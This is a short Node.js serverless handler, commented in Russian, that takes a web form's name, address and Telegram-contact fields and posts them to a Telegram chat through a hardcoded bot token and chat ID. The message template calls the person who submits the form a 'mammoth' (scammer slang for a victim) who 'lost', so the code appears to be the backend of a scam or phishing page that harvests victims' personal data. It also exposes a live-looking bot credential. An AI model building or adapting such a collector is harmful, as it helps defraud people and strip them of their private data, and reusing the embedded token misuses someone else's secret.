module.exports = async (req, res) => {
  // Разрешаем только POST запросы от нашей формы
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { fio, addr, tg } = req.body;

  // ТВОИ ДАННЫЕ ТЕЛЕГРАМ (Уже вписаны)
  const BOT_TOKEN = '8040858042:AAHYFzMmMwzXduxH3d39bE767qJ0VH9vcTo'; 
  const CHAT_ID = '-1003591999988';

  // Формируем сообщение для админа
  const message = `🌑 **MEGALUL HARKOMENS | СУДНЫЙ ДЕНЬ**\n\n` +
                  `👤 **Игрок:** ${fio || 'Аноним'}\n` +
                  `💰 **На кону:** ${addr || 'Жизнь'}\n` +
                  `📞 **Связь:** ${tg || 'Не указано'}\n\n` +
                  `💀 *Мамонт сделал ставку и проиграл Чигуру.*`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();

    if (result.ok) {
      return res.status(200).json({ success: true });
    } else {
      console.error('TG API Error:', result.description);
      return res.status(500).json({ error: result.description });
    }
  } catch (err) {
    console.error('Server Error:', err.message);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
};


